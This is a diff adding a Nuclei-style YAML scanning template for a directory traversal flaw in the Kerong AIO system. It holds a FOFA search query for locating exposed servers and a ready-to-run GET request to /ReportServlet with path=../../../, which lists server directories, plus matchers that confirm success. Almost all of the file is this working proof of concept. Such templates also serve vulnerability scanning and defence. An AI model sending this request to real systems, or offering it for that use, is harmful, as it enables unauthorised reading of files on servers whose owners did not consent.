@@ -1,0 +1,24 @@
+id: kerong-aio-directory-traversal
+
+info:
+  name: "科荣 AIO 系统目录遍历漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "changeAccount('8000')"
+      该漏洞源于系统未正确校验用户输入路径参数，攻击者可通过构造恶意请求访问受限目录层级，实现非授权文件读取。此缺陷允许远程攻击者绕过目录访问控制逻辑，获取服务器端敏感文件内容，建议通过输入验证机制修复该安全问题。
+  tags: 科荣AIO
+
+http:
+- raw:
+  - |
+    GET /ReportServlet?operation=getFileList&path=../../../ HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'fileList'
